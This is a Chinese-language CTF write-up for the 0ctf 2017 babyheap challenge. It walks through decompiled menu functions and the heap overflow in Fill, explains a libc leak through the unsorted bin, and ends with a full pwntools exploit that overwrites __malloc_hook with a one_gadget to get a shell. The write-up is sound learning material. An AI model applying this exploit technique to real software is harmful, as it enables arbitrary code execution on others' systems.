# 0ctf_2017_babyheap

[题目地址](https://buuoj.cn/challenges#0ctf_2017_babyheap)

我可能这辈子都学不会堆了，倒不是攻击手段看不明白，而是堆块大小不知道怎么决定，说白了就是基础不好，还没法调试。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

来来来直接上[wp](https://blog.csdn.net/mcmuyanga/article/details/112466134)，不挣扎了。这题经典堆菜单题，用某个大佬的话说就是“毫无想象力”。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)

{

  char *heap; // [rsp+8h] [rbp-8h]



  heap = GetHeap();

  while ( 1 )

  {

    Menu(a1, a2);

    switch ( GetInput() )

    {

      case 1LL:

        a1 = (__int64)heap;

        Allocate(heap);

        break;

      case 2LL:

        a1 = (__int64)heap;

        Fill(heap);

        break;

      case 3LL:

        a1 = (__int64)heap;

        FreeHeap(heap);

        break;

      case 4LL:

        a1 = (__int64)heap;

        Dump(heap);

        break;

      case 5LL:

        return 0LL;

      default:

        continue;

    }

  }

}
```

Allocate分配堆块，重点看一下堆块的结构。

```c
void __fastcall Allocate(__int64 a1)
{
  int index; // [rsp+10h] [rbp-10h]
  int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( index = 0; index <= 15; ++index )
  {
    if ( !*(_DWORD *)(24LL * index + a1) )      // 1个自定义堆块结构占用24字节
    {
      printf("Size: ");
      v2 = GetInput();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * index + a1) = 1;     // heap第一位记录占用情况
        *(_QWORD *)(a1 + 24LL * index + 8) = v2;// +8处记录申请的堆块大小
        *(_QWORD *)(a1 + 24LL * index + 16) = v3;// +16处记录实际存储内容的堆块
        printf("Allocate Index %d\n", (unsigned int)index);
      }
      return;
    }
  }
}
```

Fill的漏洞就很明显了，连我都能看出来。填充内容时又问了一遍size，导致堆溢出。

```c
__int64 __fastcall Fill(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = GetInput();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = GetInput();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

free很正常，把Allocate里的结构全置空，该free的free了，没有uaf。

```c
__int64 __fastcall FreeHeap(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = GetInput();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

Dump打印内容，注意它是根据Allocate时存储的size来决定打印多少的，这种结构10个里面7个有问题。

```c
int __fastcall Dump(__int64 a1)
{
  int result; // eax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = GetInput();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```

看来漏洞只有个堆溢出。由于开了全relro，不能用普通的改got表为system的方法了，要想办法往`__malloc_hook`里填one_gadget地址。这就很容易想到fastbin attack中的一个技术——让malloc返回任意地址处的堆块。如果我们能让malloc返回`__malloc_hook`周围地址的堆块，就能改写`__malloc_hook`了。堆溢出在手，这点不难办到，通过溢出修改一个堆块的fd指针，由于malloc根据fd指针取堆块，所以如果我们把fd指针改到`__malloc_hook`附近，就能分配到那块区域了。

还有个问题，这次有pie，我们需要先泄露地址。这里有个关于[unsorted bin泄露地址](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin-leak)的小技巧：当unsorted bin中只有一个堆块时，其fd与bk都是main_arena + offset。意味着如果我们能打印出一个已经进入unsorted bin的堆块的fd或者bk，减去某个偏移就时main_arena的地址了。得到main_arena的地址再减去main_arena的偏移就是libc_base。这个减去的值一般是0x3c4b78，包含offset和main_arena本身的偏移。最后的问题时我们怎么打印出fd和bk？这就要用到chunk extend and overlapping了。直接看exp吧，大佬讲的很清楚。

```python
from pwn import *

context.log_level = 'debug'
p=remote("node4.buuoj.cn",29543)

def add(size):
    p.sendlineafter('Command: ','1')
    p.sendlineafter('Size: ',str(size))

def edit(idx,content):
    p.sendlineafter('Command: ','2')
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(len(content)))
    p.sendlineafter('Content: ',content)

def delete(idx):
    p.sendlineafter('Command: ','3')
    p.sendlineafter('Index: ',str(idx))

def show(idx):
    p.sendlineafter('Command: ','4')
    p.sendlineafter('Index: ',str(idx))

#---------------这3个一组，是为了泄漏libc地址----------#
add(0x10)#0
add(0x10)#1
add(0x80)#2
#---------------这3个一组，是为了fastbin attack 覆写malloc hook 为one_gadget ----------#
add(0x30)#3
add(0x68)#4
add(0x10)#5

#------------------泄漏libc地址------------------------------------#
edit(0,p64(0)*3+p64(0xb1))#通过edit(0)来改变chunk1的大小，使其包裹chunk2
delete(1)
add(0xa0)#1   delete再add回来使为了改变结构体中的size值，因为show的长度是根据这个值来定的。
edit(1,p64(0)*3+p64(0x91))  #因为通过calloc申请回chunk1的所以chunk2被清零，我们要根据原来chunk2的内容恢复chunk2。，
delete(2)  #使得chunk2进入unsorted bin。free后chunk2的fd和bk就变成了main_arena+offset，包含在chunk1的内容中
show(1)     #那么我们打印chunk1的内容就能泄漏chunk2的fd
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) -0x3c4b78
malloc_hook =  libc_base + 3951376

#-----------------fastbin attack-------------------------------------#
delete(4)#释放使其进入fastbin
edit(3,p64(0)*7+p64(0x71)+p64(malloc_hook-0x23)) #通过堆块3的溢出修改已经被free的堆块4的fd指针为malloc_hook-0x23。这里算是个公式了，分配到这里才能通过错位构造出0x7f的size域。
add(0x68)#2    #fasbin attack。大佬这里标得到的是2好号堆块我不太懂，刚刚delete的是4号，那这个应该是4号，况且2号堆块不是在unsorted bin里吗？
add(0x68)#4    #这个堆块就分配到__malloc_hook周围了，下面编辑为one_gadget
one = [0xf1147,0xf02a4,0x4526a,0x45216]
one_gadget = libc_base + one[2]
edit(4,b'\x00'*0x13+p64(one_gadget)) #覆盖malloc_hook为one_gadget

add(0x10)

p.interactive() 
```